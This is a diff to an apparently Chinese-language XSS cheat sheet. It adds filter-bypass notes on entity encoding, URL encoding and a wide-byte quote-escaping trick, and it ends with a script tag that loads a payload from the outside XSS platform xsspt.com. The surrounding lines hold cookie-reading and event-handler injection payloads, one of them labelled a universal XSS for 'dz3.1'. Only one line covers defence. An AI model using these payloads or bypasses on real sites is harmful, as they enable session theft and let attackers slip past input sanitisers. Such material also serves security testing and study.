@@ -57,7 +57,7 @@ ed2k://|file|test|'+alert(document.cookie)+'|test/ dz3.1通用XSS
 [email=2"onmouseover="alert(2)]2[/email]
 ```
 
-## 绕过XSS fitter的方法
+## 绕过XSS fitter的方法 bypass
 ```
 1. 利用<>标记注射html/javacript:
 <script>alert(/xss/)</script>
@@ -111,3 +111,19 @@ header("Location: http://www.baidu.com");    //将网页重定向到百度，增
 1.firebug 
 2.fiddler
 ```
+
+## xss的修复方案
+```
+过滤，输入过滤，输出过滤，相信你们比我懂
+```
+
+在HTML属性中，会自动对实体字符进行转义。一个简单的比方。
+   <img src="1" onerror="alert(1)">
+   和
+   <img src="1" onerror="alert&#x28;1&#x29;"> 
+   是等效的
+'被过滤，我们可以将'写为 &#x27;
+代码转换为 url 的编码。 &-> %26, # -> %23
+腾讯对双引号的屠杀：宽字节%c0%22; 会变成这样：�"  并不是因为%22变成了 %5c%22,而 %c0吃掉了后面的%5c
+
+<script src=http://xsspt.com/MPfFLX?1530111119></script>
